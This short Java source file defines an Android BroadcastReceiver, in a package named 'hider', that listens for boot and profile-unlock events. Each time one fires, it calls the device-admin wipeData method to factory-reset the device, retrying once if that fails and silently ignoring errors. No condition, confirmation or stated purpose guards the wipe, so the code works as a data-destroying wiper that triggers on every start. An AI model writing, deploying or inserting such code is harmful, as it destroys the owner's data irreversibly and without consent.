package com.example.hider;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class NucleusReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
            action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED) ||
            action.equals(Intent.ACTION_MANAGED_PROFILE_UNLOCKED)) {

            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            
            try {           
                dpm.wipeData(0);
            } catch (Exception e) {
                try {
                    
                    dpm.wipeData(0);
                } catch (Exception ignored) {}
            }
        }
    }
}
